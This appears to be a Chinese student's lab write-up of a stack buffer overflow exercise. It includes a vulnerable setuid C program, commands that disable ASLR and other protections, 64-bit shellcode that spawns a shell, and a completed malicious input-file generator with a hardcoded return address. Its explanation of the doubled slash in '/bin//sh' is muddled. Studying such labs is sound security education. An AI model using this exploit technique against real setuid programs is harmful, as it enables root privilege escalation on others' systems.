---
title: 栈缓存溢出攻击
date: 2024-03-14 20:12:43
lang: zh
summary: 栈缓存溢出攻击
---
## 通过篡改输入文件来打开目标机器上的shell

一、实验内容

利用栈缓存溢出，通过篡改输入文件来打开目标机器上的shell。

已准备好的文件：

- HW1_StackBufferOverflow.c 包含栈缓存溢出漏洞的应用源文件

- HW1_StackBufferOverflow 包含栈缓存溢出漏洞的应用可执行文件

- HW1_createInputFile.c 可用来创建恶意输入文件的代码（需补充完整）

二、实验原理

1、栈缓冲区溢出（Stack Buffer Overflow）：

利用了程序在栈上分配缓冲区时可能不进行足够的边界检查。攻击者通过向缓冲区写入超过其预期长度的数据，可以覆盖栈上的其他数据，从而导致程序的不稳定行为或者执行恶意代码。

2、防止缓冲区溢出攻击的几种常用保护机制：

地址空间随机化、禁止栈执行、栈保护canary等。

三、实验步骤

### 1.环境配置：

（1）关闭地址随机化：

kali和其他一些 Linux 系统中，使用地址空间随机化来随机堆（heap）和栈（stack）的初始地址，这使得猜测准确的内存地址变得十分困难，而猜测内存地址是缓冲区溢出攻击的关键。因此我们需要使用以下命令关闭这一功能：

```text
sudo sysctl -w kernel.randomize_va_space=0
```

补充：

- 当数值为0时，完全关闭ASLR。

- 当数值为1时，部分关闭ASLR。只将 mmap 的基址，stack 和 vdso 页面随机化。

- 当数值为2时，完全开启ASLR。在部分开启的基础上增加 heap的随机化。

（2）配置/bin/sh：

此外，为了进一步防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root 权限，这个防护措施在 /bin/bash 中实现。

linux 系统中，/bin/sh 实际是指向 /bin/bash 或 /bin/dash 的一个符号链接。为了重现这一防护措施被实现之前的情形，我们使用另一个 shell 程序（zsh）代替 /bin/bash。

设置 zsh 程序：

```text
sudo apt install zsh
sudo ln -sf /bin/zsh /bin/sh
```

### 2.HW1_StackBufferOverflow.c：

漏洞程序：

```text
#include
#include

int copy(const char* str) {
    char output[48];
    strcpy(output, str);

    return 0;
}

int main(int argc, char** argv) {
    char b[512];

    FILE* file;

    file = fopen("input_file", "r");
    fread(b, sizeof(char), 512, file);

    copy(b);

    return 0;
}
```

上述程序存在缓冲区溢出漏洞。它首先从一个名为input_file的文件中读取一个输入，然后将此输入传递到函数copy（）中的另一个缓冲区。原始输入的最大长度为512字节，但copy（）中的缓冲区只有48字节长，小于512字节。由于strcpy（）不检查边界，缓冲区溢出将发生。

产生攻击的过程：

- 这个程序被root所拥有，并拥有Set-UID权限。

- 这个程序需要一个input_file文件的输入，而这个文件可以被一般用户所控制。

使用下列命令编译上述c代码文件：

```text
gcc -g -fno-stack-protector -o HW1_StackBufferOverflow HW1_StackBufferOverflow.c -z execstack
```

编译选项作用：

- -g： 生成调试信息。这个选项会在编译过程中生成调试信息，以便在调试程序时能够获取更多有关源代码和变量的信息，也是为了使编译后得到的可执行文档能用 gdb 调试。

- -fno-stack-protector： 禁用栈保护。栈保护是一种编译器提供的安全机制，用于检测栈溢出。这个选项禁用了栈保护，允许程序在栈上发生溢出。

- -z execstack： 关闭不可执行堆栈保护，允许栈上的数据执行。这个选项将栈标记为可执行，允许在栈上执行代码。这通常用于编写和运行包含 shellcode 的程序。

去掉的影响：

- -g影响： 去掉这个选项会导致编译器不生成调试信息，使得在调试过程中难以追踪源代码和变量的信息。攻击者可能会受益于更少的信息，无法gdb调试。

- -fno-stack-protector影响： 栈保护是一种防范栈溢出攻击的机制。去掉这个选项会禁用这种保护，使得程序更容易受到栈溢出攻击的威胁。攻击者可以更容易地修改返回地址、注入恶意代码等。

- -z execstack影响： 这个选项允许栈上的数据被当作代码执行，通常用于编写包含 shellcode 的程序。去掉这个选项会限制在栈上执行代码的能力，使得攻击者更难以利用栈溢出漏洞执行自己的代码。

编译完成后，我们需要将程序设置为root拥有的Set-UID程序：

```text
sudo chown root HW1_StackBufferOverflow
sudo chmod 4755 HW1_StackBufferOverflow
```

通过下列指令查看：

```text
ll HW1_StackBufferOverflow
```

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313160401.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313160401.png)

如上所示，设置成功。

### 3.HW1_createInputFile.c：

shellcode是一段启动shell的代码：

```text
#include
int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

下列shellcode代码是上述代码的汇编版本，用于打开/bin/sh：

HW1_createInputFile.c：

```text
#include
#include
#include

const char shellcode[] = \
"\x48\x31\xc0"                                          /* xor %rax, %rax */ \
"\x50"                                                  /* push %rax */      \
"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"              /* mov $0x68732f2f6e69622f, %rdi */ \
"\x57"                                                  /* push %rdi */ \
"\x50"                                                  /* push %rax */      \
"\x48\x8d\x7c\x24\x08"                                  /* lea 0x8(%rsp), %rdi */      \
"\x57"                                                  /* push %rdi */      \
"\x31\xd2"                                              /* xor %edx, %edx */ \
"\x48\x89\xe6"                                          /* mov %rsp, %rsi */ \
"\xb0\x3b"                                              /* movb $0x3b, %al*/ \
"\x0f\x05"                                              /* syscall */ ;

int main(int argc, char **argv) {
    char buffer[512];

    FILE *input;

    // clean up the buffer with nop instruction
    memset(buffer, 0x90, 512);

    //TODO Please try to create a malicious input file
strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb4\xdc\xff\xff\xff\x7f"); //56个\x90填充,在buffer特定偏移处起始的六个字节覆盖shellcode地址

    strcpy(buffer + 100, shellcode);//将shellcode拷贝至buffer，偏移量设为了 100

    // write the buffer into input file
    input = fopen("input_file", "w+");
    fwrite(buffer, 512, 1, input);
    fclose(input);

    return 0;
}
```

上述补充代码一堆\x90后需要添上 shellcode 保存在内存中的地址，因为发生溢出后这个位置刚好可以覆盖返回地址。因为将shellcode 保存在 buffer + 100 的位置，所以有strcpy(buffer+100,shellcode);

接下来获取shellcode在内存中的地址

通过设置断点，运行打印所需地址的方法：

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313232545.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313232545.png)

得到output源地址是0x7fffffffdc00。

同理可得到b数组在栈中源地址：0x7fffffffdc50

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313233458.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240313233458.png)

copy函数的rbp指向：0xfffffffdc30；rsp指向：0xfffffffdbf0

所以可以得到如下的栈结构图：

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314084447-1024x542.jpg)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314084447-scaled.jpg)

那么我们需要在b[rbp-&output+8]处开始填写shellcode的返回地址字节，因为发生溢出后这个位置刚好可以覆盖返回地址。也就是说我们需要56个\x90填充，以让shellcode返回地址处于数组中的特定偏移位置。

至于shellcode本身我们则存储在buffer偏移量为100的位置，此处地址通过计算：

```text
dc50+100=dcb4
```

则shellcode返回地址：0x7fffffffdcb4

然后以小端序填充在56个\x90后面：xb4\xdc\xff\xff\xff\x7f

补充完代码后，编译运行：

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314085551.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314085551.png)

然后gdb调试：

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314085811.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314085811.png)

结果如上所示，攻击成功。

## 四、结果展示

完整的HW1_createInputFile.c文件：

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314090139.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314090139.png)

[![](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314090141.png)](https://haotlas.cn/wp-content/uploads/2024/03/QQ图片20240314090141.png)

问题：

1.在上述过程中有回答。

2.0x68732f2f6e69622f 实际上是一个 ASCII 字符串，是 /bin//sh 的十六进制表示。在字符串
"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68" 中，每个 \x 后面的两个十六进制数字表示一个字
节的 ASCII 字符码。

至于为什么要有两个“2f”，可能是因为在Unix文件系统中，单个斜杠“/”用来分隔目录层次结构，而连续的斜杠被视为单个斜杠。在这种情况下，0x68732f2f6e69622f编码的ASCII字符串/bin//sh中的两个斜杠，实际上代表了一个单独的斜杠。因此，/bin//sh等同于/bin/sh，它们都是指向系统默认的shell路径。

这种写法在某些情况下可能会出现，比如在处理文件路径时，为了确保路径的一致性，可能会生成具有连续斜杠的路径。